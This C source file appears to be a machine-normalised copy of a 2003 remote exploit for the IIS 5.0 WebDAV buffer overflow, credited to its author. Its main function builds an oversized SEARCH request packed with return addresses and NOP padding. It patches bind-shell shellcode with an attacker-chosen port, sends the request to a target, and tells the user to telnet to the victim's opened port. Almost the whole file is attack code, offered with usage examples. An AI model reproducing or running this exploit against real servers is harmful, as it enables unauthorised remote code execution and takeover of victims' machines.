#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {void* sin_port; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  dst ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int GETPROCADDRESS ; 
 size_t GETPROC_OFFSET ; 
 int LOADLIBRARYA ; 
 size_t LOADL_OFFSET ; 
 int MAXBUF ; 
 int NOP ; 
 size_t PORT_OFFSET ; 
 int RET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 char* body ; 
 int /*<<< orphan*/  FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int FUNC4 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* FUNC7 (char*) ; 
 void* FUNC8 (int) ; 
 char* jumpcode ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int /*<<< orphan*/  FUNC12 (char*,...) ; 
 int FUNC13 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC14 (int,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 int FUNC15 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*,char*,int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC17 (char*,char*) ; 
 int FUNC18 (char*) ; 
 unsigned long FUNC19 (char*,int /*<<< orphan*/ *,int) ; 

int FUNC20 (int argc, char **argv) 
{

unsigned long ret;
unsigned short port;
int tport, bport, s, i, j, r, rt=0;
struct hostent *h;
struct sockaddr_in dst;
char buffer[MAXBUF];

if (argc < 2 || argc > 5) 
{
FUNC12("IIS 5.0 WebDAV Exploit by RoMaNSoFt <roman@rs-labs.com>. 23/03/2003\nUsage: %s <target host> [target port] [bind port] [ret]\nE.g 1: %s victim.com\nE.g 2: %s victim.com 80 31337 %#.4x\n", argv[0], argv[0], argv[0], RET);
FUNC5(-1);
}

// Default target port = 80
if (argc > 2)
tport = FUNC0(argv[2]);
else
tport = 80;

// Default bind port = 31337
if (argc > 3)
bport = FUNC0(argv[3]);
else
bport = 31337;

// Default ret value = RET
if (argc > 4)
ret = FUNC19(argv[4], NULL, 16);
else
ret = RET;

if ( ret > 0xffff || (ret & 0xff) == 0 || (ret & 0xff00) == 0 ) 
{
FUNC6(stderr, "RET value must be in 0x0000-0xffff range and it may not contain null-bytes\nAborted!\n");
FUNC5(-2);
}

// Shellcode patching
port = FUNC8(bport);
port ^= 0x9999;

if ( ((port & 0xff) == 0) || ((port & 0xff00) == 0) ) 
{
FUNC6(stderr, "Binding-port contains null-byte. Use another port.\nAborted!\n");
FUNC5(-3);
}

*(unsigned short *)&shellcode[PORT_OFFSET] = port;
*(unsigned long *)&shellcode[LOADL_OFFSET] = LOADLIBRARYA ^ 0x99999999;
*(unsigned long *)&shellcode[GETPROC_OFFSET] = GETPROCADDRESS ^ 0x99999999;
// If the last two items contain any null-bytes, exploit will fail.
// WARNING: this check is not performed here. Be careful and check it for yourself!

// Resolve hostname
FUNC12("[*] Resolving hostname ...\n");
if ((h = FUNC7(argv[1])) == NULL)
{
FUNC6(stderr, "%s: unknown hostname\n", argv[1]);
FUNC5(-4);
}

FUNC1(h->h_addr, &dst.sin_addr, h->h_length);
dst.sin_family = AF_INET;
dst.sin_port = FUNC8(tport);

// Socket creation
if ((s = FUNC15(AF_INET, SOCK_STREAM, 0)) == -1) 
{
FUNC11("Failed to create socket");
FUNC5(-5);
}

// Connection
if (FUNC4(s, (struct sockaddr *)&dst, sizeof(dst)) == -1)
{
FUNC11("Failed to connect");
FUNC5(-6);
}

// Build malicious string...
FUNC12("[*] Attacking port %i at %s (EIP = %#.4x%.4x)...\n", tport, argv[1], ((ret >> 8) & 0xff), ret & 0xff); 

FUNC2(buffer, MAXBUF);
FUNC17(buffer, "SEARCH /");

i = FUNC18(buffer);
buffer[i] = NOP; // Align for RET overwrite

// Normally, EIP will be overwritten with buffer[8+2087] but I prefer to fill some more bytes ;-) 
for (j=i+1; j < i+2150; j+=2)
*(unsigned short *)&buffer[j] = (unsigned short)ret;

// The rest is padded with NOP's. RET address should point to this zone!
for (; j < i+65535-FUNC18(jumpcode); j++)
buffer[j] = NOP;

// Then we skip the body of the HTTP request
FUNC9(&buffer[j], jumpcode, FUNC18(jumpcode));

FUNC17(buffer+FUNC18(buffer), " HTTP/1.1\r\n");
FUNC16(buffer+FUNC18(buffer), "Host: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n", argv[1], FUNC18(body) + FUNC18(shellcode));
FUNC17(buffer+FUNC18(buffer), body);

// This byte is used to mark the beginning of the shellcode
FUNC10(buffer+FUNC18(buffer), 0x01, 1);

// And finally, we land into our shellcode
FUNC10(buffer+FUNC18(buffer), NOP, 3);
FUNC17(buffer+FUNC18(buffer), shellcode);

// Send request
if (FUNC14(s, buffer, FUNC18(buffer), 0) != FUNC18(buffer))
{
FUNC11("Failed to send");
FUNC5(-7);
}

FUNC12("[*] Now open another console/shell and try to connect (telnet) to victim port %i...\n", bport);

// Receive response
while ( (r=FUNC13(s, &buffer[rt], MAXBUF-1, 0)) > 0)
rt += r;
// This code is not bullet-proof. An evil WWW server could return a response bigger than MAXBUF
// and an overflow would occur here. Yes, I'm lazy... :-)

buffer[rt] = '\0';

if (rt > 0)
FUNC12("[*] Victim server issued the following %d bytes of response:\n--\n%s\n--\n[*] Server NOT vulnerable!\n", rt, buffer);
else
FUNC12("[*] Server is vulnerable but the exploit failed! Change RET value (e.g. 0xce04) and try again (when IIS is up again) :-/\n", bport);

FUNC3(s);

}